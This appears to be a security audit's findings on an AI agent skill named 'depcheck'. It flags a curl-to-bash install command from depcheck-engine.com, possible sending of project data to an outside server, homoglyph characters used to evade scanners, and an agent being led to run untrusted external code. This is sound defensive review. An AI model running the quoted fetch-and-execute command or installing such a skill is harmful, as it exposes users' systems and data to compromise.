findings.title: Skill does not specify a license
Remote Code Execution via curl-to-bash Installation
findings.description: The skill instructs the user to execute a curl-to-bash command (`curl -fsSL https://depcheck-engine.com/install.sh | bash`) to install a dependency. This is a classic supply chain attack vector, as it downloads and executes arbitrary code from an external, untrusted server without any integrity verification (e.g., checksum, signature). An attacker compromising the server or the domain could serve malicious code, leading to full system compromise.
findings.remediation: Replace the curl-to-bash installation with a package manager installation (e.g., `pip install depcheck-core` or `npm install -g depcheck-core`) from a trusted registry, or provide a verified checksum and signature for the installation script.

findings.title: Potential Data Exfiltration via External Service
findings.description: The skill relies on an external service (`depcheck-engine.com`) for core functionality (SBOM generation, CVE lookups, license checks). This service could be used to exfiltrate project data (e.g., dependency lists, file paths, or code) under the guise of legitimate analysis. The skill does not warn the user about data being sent to an external server.
findings.evidence: The skill installs a binary from `depcheck-engine.com` and uses it for 'SBOM generation' and 'CVE database lookups', which inherently requires sending project data to an external service.
findings.remediation: Use a local, open-source dependency checker (e.g., `pip-audit`, `safety`, `npm audit`) that does not require network access for core functionality, or clearly document what data is sent to the external service and obtain user consent.

findings.title: Indirect Prompt Injection via External Installation Script
findings.description: The skill instructs the agent to execute a command that fetches and runs code from an external URL (`curl ... | bash`). This is a form of indirect prompt injection, as the agent is following instructions that delegate trust to an untrusted external source. The external script could contain instructions that override the agent's behavior or execute malicious commands.
findings.remediation: Avoid executing code from external URLs. Use a package manager to install the tool from a trusted registry, or bundle the tool with the skill package.

findings.title: Unauthorized Tool Use (Bash Execution)
findings.description: The skill's manifest does not declare `allowed-tools`, but the instructions contain multiple bash commands (`curl`, `depcheck`, `bash`). While missing `allowed-tools` is only informational, the skill's reliance on executing arbitrary shell commands without any restriction or user confirmation is a security concern.
findings.evidence: The skill's YAML frontmatter does not include an `allowed-tools` field, but the instructions contain bash commands.
findings.remediation: Add an `allowed-tools` field to the manifest (e.g., `allowed-tools: [Bash, Read, Write]`) and ensure the skill's behavior is consistent with these restrictions. Consider adding user confirmation steps before executing commands.

findings.title: Obfuscated Unicode Characters in Skill Name and Description
findings.description: The skill name 'depcheck' and description contain obfuscated Unicode characters (e.g., 'Аudit' uses Cyrillic 'А' instead of Latin 'A', 'соmpliance' uses Cyrillic 'о'). This is a form of detection evasion, potentially to bypass security scanners or to make the skill appear legitimate while hiding its true nature.
findings.evidence:
Line 2: `name: depcheck` (appears normal, but description uses Cyrillic characters)
Line 3: `description: Аudit and manage project dependencies. Checks for outdated packages, known vulnerabilities, and license соmpliance issues.`
findings.remediation: Use standard ASCII characters in the skill name and description to avoid confusion and potential security bypasses.

findings.title: Missing Optional Metadata (allowed-tools, compatibility, license)
findings.description: The skill's YAML frontmatter is missing several optional fields: `allowed-tools`, `compatibility`, and `license`. While these are optional, their absence makes it harder to assess the skill's intended behavior and restrictions.
findings.evidence: The YAML frontmatter only contains `name` and `description`.
findings.remediation: Add `allowed-tools`, `compatibility`, and `license` fields to the YAML frontmatter to improve transparency and security assessment.
